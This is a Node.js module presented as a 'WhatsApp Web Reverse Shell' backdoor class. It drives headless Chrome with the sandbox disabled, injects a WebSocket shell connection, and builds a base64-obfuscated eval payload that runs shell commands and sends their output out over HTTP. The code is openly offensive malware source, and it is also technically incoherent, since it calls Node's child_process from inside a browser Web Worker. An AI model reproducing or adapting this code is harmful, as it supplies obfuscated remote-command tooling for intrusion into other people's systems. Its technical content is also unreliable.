const puppeteer = require('puppeteer-core');
const request = require('request-promise-native');
const crypto = require('crypto');
const readline = require('readline');

/**
 * WhatsApp Web Reverse Shell Implementation
 */
class WhWebBackdoor {
  constructor(options = {}) {
    this.socketUrl = options.socketUrl || '/ws/socket.io';
    this.interval = options.pingInterval || 5000;
    this.browserInstance = null;
    this.page = null;
    this.wsConnection = null;
  }

  async inject(payload) {
    try {
      // Create browser instance
      this.browserInstance = await puppeteer.launch({
        executablePath: '/usr/bin/google-chrome-stable',
        args: [
          '--remote-debugging-port=9222',
          '--headless',
          '--disable-gpu',
          '--no-sandbox'
        ],
        product: 'chrome'
      });

      // Connect to page
      const pages = await this.browserInstance.pages();
      this.page = pages[0];

      // Inject WebSocket payload
      await this.page.evaluate(payload => {
        try {
          global.waSocket = new WebSocket(payload.url);
          
          waSocket.onopen = () => {
            console.debug('Reverse shell connected');
            waSocket.send(JSON.stringify({type: 'connect'}));
          };

          setInterval(() => {
            waSocket.send(JSON.stringify({type: 'ping'}));
          }, payload.interval);
        } catch(e) {
          console.error('Shell injection failed:', e);
        }
      }, {
        url: this.socketUrl,
        interval: this.interval,
        ...payload
      });

      return true;
    } catch(err) {
      console.error('Injection failed:', err.stack);
      return false;
    }
  }

  static generatePayload(command = '') {
    return `
      (function(){
        try {
          eval(atob('${Buffer.from(`
            function executeCommand(cmd) {
              const worker = new Worker(URL.createObjectURL(new Blob(\`
                self.postMessage(require(\'child_process\').execSync(\${cmd}));
              \`, { type: 'application/javascript' })));
              
              worker.onmessage = (event) => {
                fetch('/api/update/terminal?output=' + encodeURIComponent(event.data));
                worker.terminate();
              };
            }

            if (${command ? 'true' : 'false'}) {
              executeCommand(${command});
            }
          `).toString('base64')}'))
        } catch(e) {}  
      })();`;
  }

  async cleanup() {
    if (this.browserInstance) {
      await this.browserInstance.close();
    }
    
    if (this.wsConnection) {
      this.wsConnection.close();
    }
  }
}

module.exports = WhWebBackdoor;